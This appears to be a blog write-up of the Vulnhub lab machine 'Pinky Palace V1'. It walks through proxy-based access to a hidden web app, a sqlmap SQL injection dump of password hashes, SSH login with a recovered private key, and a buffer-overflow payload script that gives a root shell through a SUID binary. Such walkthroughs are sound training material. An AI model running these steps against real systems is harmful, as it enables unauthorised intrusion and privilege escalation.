---
title:      "Pinky Palace V1 - Vulnhub"
---

It was a very awesome machine by [Pink_P4nther](https://twitter.com/@Pink_P4nther).

-------------------------------------------------------

# Nmap

Using nmap to analyze the services running on the machine in order to find something of interest, using `nmap -sV -sC -A -p- -T5 192.168.0.10`:-

```s
robin@oracle:~$ nmap -sV -sC -A -p- -T5 192.168.0.106

Starting Nmap 7.60 ( https://nmap.org ) at 2019-11-19 11:06 IST
Nmap scan report for 192.168.0.106
Host is up (0.00063s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE    VERSION
8080/tcp  open  http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  http-proxy Squid http proxy 3.5.23
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-server-header: squid/3.5.23
|_http-title: ERROR: The requested URL could not be retrieved
64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:02:12:4f:4c:6d:50:27:6a:84:e9:0e:5b:65:bf:a0 (RSA)
|   256 0a:ad:aa:c7:16:f7:15:07:f0:a8:50:23:17:f3:1c:2e (ECDSA)
|_  256 4a:2d:e5:d8:ee:69:61:55:bb:db:af:29:4e:54:52:2f (EdDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
```

So, from above scan we know that there is nginx server running on port 8080 and a http-proxy at port 31337? I actually never have seen it though, this is going to be an interesting challenge and lastly a SSH service at port 64666.


# Nginx server enumeration and the Squid proxy

Now, let's checkout the nginx server.

![](/img/pinkyplacev1/nginx.png)

Apparently, we are not authorized? Oh, well have another service to look out for so I'm going to try Squid proxy.


So, we can't access this as well.

![](/img/pinkyplacev1/squid.png)

### The Squid proxy

While using curl, I found out that I can access the service if I have used the proxy `127.0.0.1:` and port `8080` using `curl http://127.0.0.1:8080 -x 192.168.0.106:31337` we can see the following:-

```s
robin@oracle:~$ curl http://127.0.0.1:8080 -x http://192.168.0.106:31337
<html>
	<head>
		<title>Pinky's HTTP File Server</title>
	</head>
	<body>
		<center><h1>Pinky's HTTP File Server</h1></center>
		<center><h3>Under Development!</h3></center>
	</body>
<style>
html{
	background: #f74bff;
}
</html>
```

So, what happening here is we can access the service of nginx server if we use the squid service url as a proxy in order to access the nginx service.

>Note: To setup this proxy, go to browser -> preferences -> network setting -> setup the server proxy as the proxy. In this case add machine IP as hostname and 31337 as the port/. In case if it doesn't connect, go to `about:config` and toggle `network.proxy.allow_hijacking_localhost` to true and you're good to go.


# HTTP Service

After, doing the setup I used the gobuster to perform a directory traversal, apparently it provides us to use a proxy which will help, so let's get going:-

```s
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://127.0.0.1:8080
[+] Threads:        25
[+] Wordlist:       /usr/share/dirb/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Proxy:          http://192.168.0.106:31337
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,xml,php
[+] Timeout:        10s
===============================================================
2019/11/19 02:06:54 Starting gobuster
===============================================================
/littlesecrets-main (Status: 301)
===============================================================
2019/11/19 02:12:05 Finished
```

So, going to that url, I found a login page saying "Pinky's Admin Files Login". "Files"? What does this supposed to mean? An upload service afterwards? 

![](/img/pinkyplacev1/web.png)


Source code of that page has:-

```s
<html>
	<head>
		<title>Login</title>
	</head>
	<body>
		<center>
			<div class="titlelog">
				<h1>Pinky's Admin Files Login</h1>
			</div>
		</center>
		<center>
			<div class="log">
				<form action="login.php" method="post">
					<h3>User:</h3>
					<input type="text" name="user"/>
					<h3>Password:</h3>
					<input type="password" name="pass"/>
					<input type="submit" value="Login"/>

				</form>
			</div>
		</center>
	</body>
<style>
html{
	background: #f74bff;
}
</style>
	<!-- Luckily I only allow localhost access to my webserver! Now I won't get hacked. -->
</html>
```

As you can see the line **Luckily I only allow localhost access to my webserver! Now I won't get hacked**, we had to use a proxy to access the nginx service to our host.

At this point, I tried some of the common combinations of usernames and password and was redirecting to `/login.php` saying that either the provided username or password is incorrect. I noticed something in `/login.php`:-

```s
<h3>Incorrect Username or Password</h3><!-- Login Attempt Logged -->
```

Ah, it seems that it is capturing all the login info attempted. I thought of file traversal with an extension of `.php` since it seems like the web sever is using PHP as it's backend:-


```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://127.0.0.1:8080/littlesecrets-main/
[+] Threads:        30
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Proxy:          http://192.168.0.106:31337
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/11/19 02:50:01 Starting gobuster
===============================================================
/login.php (Status: 200)
/logs.php (Status: 200)
```

`logs.php` seems of interest, let's try that one out. Going there shows:-

![](/img/pinkyplacev1/logs.png)

# SQL Injection using sqlmap

I was kind of lost at this point, so trying random things and then I realize that it has a SQL Injection vulnerability at login service, so at the time of SQL injection I mostly rely on `sqlmap`, let's continue

>Note: I used admin as the username and passw as the values of the post requests.

```s
robin@oracle:$ sqlmap --dbms=mysql --data="user=admin&pass=pass&submit=Login" --url http://127.0.0.1:8080/littlesecrets-main/login.php --proxy=http://192.168.0.106:31337 --level=5 --risk=3 --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.3#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:44:11 /2019-11-19/

[04:44:11] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: User-Agent (User-Agent)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: sqlmap/1.3#stable (http://sqlmap.org)'||(SELECT 0x4c794262 WHERE 1781=1781 AND SLEEP(5))||'
---
[04:44:11] [INFO] testing MySQL
[04:44:11] [INFO] confirming MySQL
[04:44:11] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[04:44:11] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[04:44:11] [INFO] fetching current database
[04:44:11] [INFO] resumed: pinky_sec_db
[04:44:11] [INFO] fetching tables for database: 'pinky_sec_db'
[04:44:11] [INFO] fetching number of tables for database 'pinky_sec_db'
[04:44:11] [INFO] resumed: 2
[04:44:11] [INFO] resumed: logs
[04:44:11] [INFO] resumed: users
[04:44:11] [INFO] fetching columns for table 'logs' in database 'pinky_sec_db'
[04:44:11] [INFO] resumed: 4
[04:44:11] [INFO] resumed: lid
[04:44:11] [INFO] resumed: user
[04:44:11] [INFO] resumed: pass
[04:44:11] [INFO] resumed: useragent
[04:44:11] [INFO] fetching entries for table 'logs' in database 'pinky_sec_db'
[04:44:11] [INFO] fetching number of entries for table 'logs' in database 'pinky_sec_db'
[04:44:11] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[04:44:14] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[04:44:14] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[04:44:14] [WARNING] unable to retrieve the number of entries for table 'logs' in database 'pinky_sec_db'
[04:44:14] [INFO] fetching columns for table 'users' in database 'pinky_sec_db'
[04:44:14] [INFO] resumed: 3
[04:44:14] [INFO] resumed: uid
[04:44:14] [INFO] resumed: user
[04:44:14] [INFO] resumed: pass
[04:44:14] [INFO] fetching entries for table 'users' in database 'pinky_sec_db'
[04:44:14] [INFO] fetching number of entries for table 'users' in database 'pinky_sec_db'
[04:44:14] [INFO] resumed: 2
[04:44:14] [INFO] resumed: pinky
[04:44:14] [INFO] resumed: f543dbfeaf238729831a321c7a68bee4
[04:44:14] [INFO] resumed: 1
[04:44:14] [INFO] resumed: pinkymanage
[04:44:14] [INFO] resumed: d60dffed7cc0d87e1f4a11aa06ca73af
[04:44:14] [INFO] resumed: 2
[04:44:14] [INFO] recognized possible password hashes in column 'pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
q
[04:44:22] [ERROR] user quit

[*] ending @ 04:44:22 /2019-11-19/

```

It took so much time because I had to debug commands so many times and had to progress little by little. Finally, we have two users `pinky` and `pinkymanage`, let's crack the hashes to get password and try them out.


```
pinky: Couldn't find it :(
pinkymanage: 3pinkysaf33pinkysaf3
```

# SSH

We can now SSH into the system as user `pinkymanage` and password `3pinkysaf33pinkysaf3`, let's see what it holds for us.

![](/img/pinkyplacev1/ssh.png)

Doing some enumeration on machine I found out a RSA key in `/var/www/html/littlesecrets-main/ultrasecretadminf1l35` which seems to be useful for SSH login as key? Let's find out:-
It seems like a base64 encoded data, so I decoded it and got a SSH private key, let's login

```s
robin@oracle:~$ cat id_rsa | base64 -d > id_rsa2
robin@oracle:~$ cat id_rsa2


-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA16fxL3/+h/ILTZewkvekhIQ1yk0oLI+y3N4AItkhez11Iha8
Hc7KOx/L9g2jd3H8dGPUfKKr9seqtg97ZKA95S/sb4w3Qtl1ABu/pVKZBbGGsHG/
yIvGEPKS+BSZ4stMW7Hnx7ciMuhwcZwLqZmsySumECTueQswNPblITlrqolpYF8x
e47El9pHwewNWcIrmqraxCH5TC7UhjgGaQwmW3qHyrSqp/jK/ctb1ZpnPv+DC833
u/Tyjm6z8RaDZG/gRBIrMGnNbg4pZFhtgbGVOf7feGvBFR8BiT+7VFfO7yEvyBx9
gxrySxu2Z0aOM8QR6MGaDMjYUnB9aTYuw8GP4wIDAQABAoIBAA6iH7SIa94Pp4Kx
W1LtqOUxD3FVwPcdHRbtnXa/4wy4w9z3S/Z91K0kYDOnA0OUoXvIVl/Krf6F1+iY
rlfKo8iMcu+yxQEtPkoul9eA/k8rl6cbYNcb3OnDfAOHalXAU8MZFFAx9gkcSpz6
6LOucNIJuy/3QZNHFhNR+YRCoDKnFnEILxYL5Wz2qptWMYDuwtmGzO968YbLrOV1
okWN6gMiEi5qprBh5a8wBRQVaBrLYWg8WeXfWfkGzKoxKPFKzhI5j4/EkxLDJqt3
LA7JRxmFn77/mbvaDW8WZX0fOcS8ugyRBEN0VpdnF6kl6tfOXKGj0gd+gAiw0TVR
2CB7PsECgYEA8IW3ZsKtbCkRBtF+VTBq4K46s7ShW9AZ6+bpb+d1NRT5xRJG+Dsz
F3cg4N+39nYg8mFwsBhn/szgVBNWZouWrRNrDExH0yu6HOJ7zLWQayUhQJiIPxpc
n/Eed6SrcySfzgmntOib4hyGjF0/wntjMc73xuAVNuO8A6WW+hgVHKECgYEA5YiW
K2vbVNBqEBCP+xrC5dHOBIEWv89BFIm/Fs/esh8uE5Lnj11eP+1EZh2FK92Qx9Yv
y1bMsAkf+ptFUJLck1M20efAaSvOhr5uajnyqCofsSUfKZaa7nPQozepqMKXGMoy
MEEeLOw56sJhSp0UdXyaz9FQAmvzSXUnuo1t+gMCgYEAubx42WkCpSC9XkeOyFhg
YGsLN9UIOi9kpRAnOlxB3aD6FF494dlNZhR/lkgM9s1YOfRXIhVm0ZQCs8pPEVdA
Hx18r/2EBaWhzkZzlayr/qGooQppRFmmJ3j6ryfBomQo5+H62TA7mIuwt1oXL6c6
/a63FqPang2VFjfcc/r+6qECgYA+AzrfHFKzhWNCV9cudjp1sMtCOEYXKD1i+Rwh
Y6O85+Og8i2RdB5EkyvJkuwpv8Cf3OQowZinbq+vG0gMzsC9JNxItZ4sS+OOT+Cw
3lsKx+asC2Vx7PiKt8uEbUNvDrOXxPjuRImMhX3YSQ/UAsBGRZXl050UKmoeTIKh
ShiOVQKBgQDsS41imCxW2me541vtwAaIpQ5lo5OVzD2A9teEPsU6F2h6X7pWR6IX
A9rpLWmbfxGgJ0MVhxCjpeYgSC8UsdMzNa2ApcwOWQekNE4eLtO7Zv2SVDr6cIrc
HccEP+MGM2eUfBPnkaPkbCPr7tnqPf8eJqiQUkWVh2CnYzeAHr5OmA==
-----END RSA PRIVATE KEY-----


robin@oracle:/tmp/tmp$ ssh pinky@192.168.0.106 -p 64666 -i id_rsa2
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov 19 04:04:11 2019 from 192.168.0.105
pinky@pinkys-palace:~$ 
```

And we are logged in as `pinky`, let's enumerate more.

# Root

In the `/home/pinky` I found a SUID binary which has a `notes.txt` attached, it says:-

>Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(

I'm getting a buffer overflow vibe here :P

### Buffer Overflow 

I transferred the binary via `scp` to ease the process, so let's get it done:-

Here's my gdb-history:-

```s
robin@oracle:/tmp/tmp$ gdb-gef -q adminhelper 
Reading symbols from adminhelper...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 1 command could not be loaded, run `gef missing` to know why.
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000000618  _init
0x0000000000000640  strcpy@plt
0x0000000000000650  puts@plt
0x0000000000000660  execve@plt
0x0000000000000670  setegid@plt
0x0000000000000680  seteuid@plt
0x0000000000000690  __cxa_finalize@plt
0x00000000000006a0  _start
0x00000000000006d0  deregister_tm_clones
0x0000000000000710  register_tm_clones
0x0000000000000760  __do_global_dtors_aux
0x00000000000007a0  frame_dummy
0x00000000000007d0  spawn
0x0000000000000813  main
0x0000000000000860  __libc_csu_init
0x00000000000008d0  __libc_csu_fini
0x00000000000008d4  _fini
gef➤  checksec
[+] checksec for '/tmp/tmp/adminhelper'
Canary                        : No
NX                            : No
PIE                           : Yes
Fortify                       : No
RelRO                         : Partial
gef➤  disas spawn
Dump of assembler code for function spawn:
   0x00000000000007d0 <+0>:	push   rbp
   0x00000000000007d1 <+1>:	mov    rbp,rsp
   0x00000000000007d4 <+4>:	sub    rsp,0x10
   0x00000000000007d8 <+8>:	mov    DWORD PTR [rbp-0x4],0x0
   0x00000000000007df <+15>:	mov    DWORD PTR [rbp-0x8],0x0
   0x00000000000007e6 <+22>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000000007e9 <+25>:	mov    edi,eax
   0x00000000000007eb <+27>:	call   0x680 <seteuid@plt>
   0x00000000000007f0 <+32>:	mov    eax,DWORD PTR [rbp-0x8]
   0x00000000000007f3 <+35>:	mov    edi,eax
   0x00000000000007f5 <+37>:	call   0x670 <setegid@plt>
   0x00000000000007fa <+42>:	mov    edx,0x0
   0x00000000000007ff <+47>:	mov    esi,0x0
   0x0000000000000804 <+52>:	lea    rdi,[rip+0xd9]        # 0x8e4
   0x000000000000080b <+59>:	call   0x660 <execve@plt>
   0x0000000000000810 <+64>:	nop
   0x0000000000000811 <+65>:	leave  
   0x0000000000000812 <+66>:	ret    
End of assembler dump.

```

So, what happening here is we have a function name `main` which basically takes input as a cmd argument and then print it, now we have a unused function `spawn` which sets the setuid bits to 0 and spawns a shell via `execve`. Apparently, as no protections enabled we can get it done by controlling the RIP, the instruction pointer and passing `spawn` function to the IP so that we can be redirected to it. 

```s
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
gef➤  r aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
Starting program: /tmp/tmp/adminhelper aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7af4154  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000
$rsp   : 0x00007fffffffdca8  →  "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x0000555555756260  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rdi   : 0x1               
$rip   : 0x0000555555554854  →  <main+65> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0000555555756010  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x00005555555546a0  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdd80  →  0x0000000000000002
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdca8│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"	 ← $rsp
0x00007fffffffdcb0│+0x0008: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"
0x00007fffffffdcb8│+0x0010: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]"
0x00007fffffffdcc0│+0x0018: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]"
0x00007fffffffdcc8│+0x0020: "naaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaata[...]"
0x00007fffffffdcd0│+0x0028: "oaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaaua[...]"
0x00007fffffffdcd8│+0x0030: "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"
0x00007fffffffdce0│+0x0038: "qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555554849 <main+54>        call   0x555555554650 <puts@plt>
   0x55555555484e <main+59>        mov    eax, 0x0
   0x555555554853 <main+64>        leave  
 → 0x555555554854 <main+65>        ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "adminhelper", stopped, reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555554854 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000555555554854 in main ()
gef➤  pattern search jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa
[+] Searching 'jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa'
[+] Found at offset 72 (big-endian search) 
```

Now, since we know that our function is at `0x00000000000007d0` which at the runtime becoming `0x00005555555547d0`, so since there are no protections enabled on binary not even ASLR(This is a system protection), making it easier to exploit.

Let's craft a simple payload which would be something like `"A"*72 + struct.pack("<Q",0x00005555555547d0)` in python, so I wrote that payload to a file and cat it as an argument which worked as variable.

```python
from struct import pack

payload = "A"*72
payload += pack("Q",0x00005555555547d0)

with open("payload.txt", "w") as out:
    out.write(payload)
    out.close()

```

Doing that so.
We are done:-

![](/img/pinkyplacev1/rootshell.png)

----------------------------------
It was a very awesome machine, I really enjoyed it.
----------------------------------